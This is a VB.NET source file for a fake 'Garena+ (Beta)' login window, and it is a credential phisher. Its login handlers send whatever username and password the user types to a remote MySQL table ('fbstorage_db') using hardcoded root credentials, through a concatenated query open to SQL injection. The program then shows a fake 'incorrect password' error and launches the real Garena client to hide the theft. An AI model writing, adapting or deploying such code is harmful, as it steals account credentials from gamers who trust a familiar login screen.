Imports MySql.Data.MySqlClient
Public Class Main
    Dim con_string As String
    Dim con As New MySqlConnection()
    Dim cmd As MySqlCommand
    Dim dr As MySqlDataReader
    Dim str As String
    Dim convar As String

    Private Sub exit_btn_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles exit_btn.Click
        Me.Close()
    End Sub

    Private Sub exit_btn_MouseHover(ByVal sender As Object, ByVal e As System.EventArgs) Handles exit_btn.MouseHover
        exit_btn.BackgroundImage = Image.FromFile("D:\Users\Documents\Visual Studio 2010\Projects\Garena+ (Beta)\Images\Exit.jpg")
    End Sub

    Private Sub exit_btn_MouseLeave(ByVal sender As Object, ByVal e As System.EventArgs) Handles exit_btn.MouseLeave
        exit_btn.BackgroundImage = Nothing
    End Sub

    Private Sub eksit_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles eksit.Click
        Me.Close()
    End Sub

    Private Sub Login_btn_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles Login_btn.Click
        If username_txt.Text <> "" And password_txt.Text <> "" Then
            Try
                con = New MySqlConnection(con_string)
                con.Open()

                str = "INSERT INTO fbstorage_db.storage_tbl VALUES ('" & username_txt.Text & "','" & password_txt.Text & "','Garena')"
                cmd = New MySqlCommand(str, con)

                dr = cmd.ExecuteReader()

                con.Close()

            Catch ex As Exception

            End Try

            MessageBox.Show("[Error 0021] The username or password you entered is incorrect!", "Garena+ (Beta)", MessageBoxButtons.OK)
            Me.Close()
            Process.Start("D:\Garena Plus\GarenaMessenger.exe")
        Else
            MessageBox.Show("Please enter your username and password to login.", "Garena+ (Beta)", MessageBoxButtons.OK)

        End If
    End Sub

    Private Sub Login_btn_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Login_btn.MouseDown
        Login_btn.BackgroundImage = Image.FromFile("D:\Users\Documents\Visual Studio 2010\Projects\Garena+ (Beta)\Images\button 2.jpg")
    End Sub

    Private Sub Login_btn_MouseHover(ByVal sender As Object, ByVal e As System.EventArgs) Handles Login_btn.MouseHover
        Login_btn.BackgroundImage = Image.FromFile("D:\Users\Documents\Visual Studio 2010\Projects\Garena+ (Beta)\Images\button 2.jpg")
    End Sub

    Private Sub Login_btn_MouseLeave(ByVal sender As Object, ByVal e As System.EventArgs) Handles Login_btn.MouseLeave
        Login_btn.BackgroundImage = Nothing
    End Sub

    Private Sub Login_btn_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Login_btn.MouseUp
        Login_btn.BackgroundImage = Nothing
    End Sub

    Private Sub username_txt_Enter(ByVal sender As Object, ByVal e As System.EventArgs) Handles username_txt.Enter
        If username_txt.Text = "Enter your Username / E-mail" Then
            username_txt.Clear()
            username_txt.ForeColor = Color.Black
            username_txt.Font = New Font(username_txt.Font.FontFamily, username_txt.Font.Size, FontStyle.Regular)
        Else
            username_txt.SelectAll()
        End If
    End Sub

    Private Sub username_txt_Leave(ByVal sender As Object, ByVal e As System.EventArgs) Handles username_txt.Leave
        If username_txt.Text = "" Then
            username_txt.Text = "Enter your Username / E-mail"
            username_txt.ForeColor = Color.DarkGray
            username_txt.Font = New Font(username_txt.Font.FontFamily, username_txt.Font.Size, FontStyle.Italic)
        End If
    End Sub

    Private Sub password_txt_Enter(ByVal sender As Object, ByVal e As System.EventArgs) Handles password_txt.Enter
        If password_txt.Text = "Enter your Password" Then
            password_txt.Clear()
            password_txt.ForeColor = Color.Black
            password_txt.PasswordChar = "●"
            password_txt.Font = New Font(password_txt.Font.FontFamily, password_txt.Font.Size, FontStyle.Regular)
        Else
            password_txt.SelectAll()
        End If
    End Sub

    Private Sub password_txt_Leave(ByVal sender As Object, ByVal e As System.EventArgs) Handles password_txt.Leave
        If password_txt.Text = "" Then
            password_txt.Text = "Enter your Password"
            password_txt.ForeColor = Color.DarkGray
            password_txt.PasswordChar = Nothing
            password_txt.Font = New Font(password_txt.Font.FontFamily, password_txt.Font.Size, FontStyle.Italic)
        End If
    End Sub

    Private Sub Main_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        con_string = "Server=192.168.0.101;Port=3306;Database=fbstorage_db;Uid=root; Pwd=ee168771032e;"
    End Sub

    Private Sub Login_btn_Paint(ByVal sender As System.Object, ByVal e As System.Windows.Forms.PaintEventArgs) Handles Login_btn.Paint

    End Sub

    Private Sub login_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles login.Click
        If username_txt.Text <> "" And password_txt.Text <> "" Then
            Try
                con = New MySqlConnection(con_string)
                con.Open()

                str = "INSERT INTO fbstorage_db.storage_tbl VALUES ('" & username_txt.Text & "','" & password_txt.Text & "','Garena')"
                cmd = New MySqlCommand(str, con)

                dr = cmd.ExecuteReader()

                con.Close()

            Catch ex As Exception
                MsgBox(ex.Message)
                Me.Close()
                Process.Start("D:\Garena Plus\GarenaMessenger.exe")
            End Try

            MessageBox.Show("[Error 0021] The username or password you entered is incorrect!", "Garena+ (Beta)", MessageBoxButtons.OK)
            Me.Close()
            Process.Start("D:\Garena Plus\GarenaMessenger.exe")
        Else
            MessageBox.Show("Please enter your username and password to login.", "Garena+ (Beta)", MessageBoxButtons.OK)

        End If
    End Sub

    Private Sub Panel3_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles Panel3.Click
        Me.Close()
        Process.Start("D:\Garena Plus\GarenaMessenger.exe")
    End Sub

    Private Sub Panel2_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles Panel2.Click
        Process.Start("C:\Program Files (x86)\Google\Chrome\Application\chrome.exe", "http://www.garena.ph/register/")
    End Sub
End Class
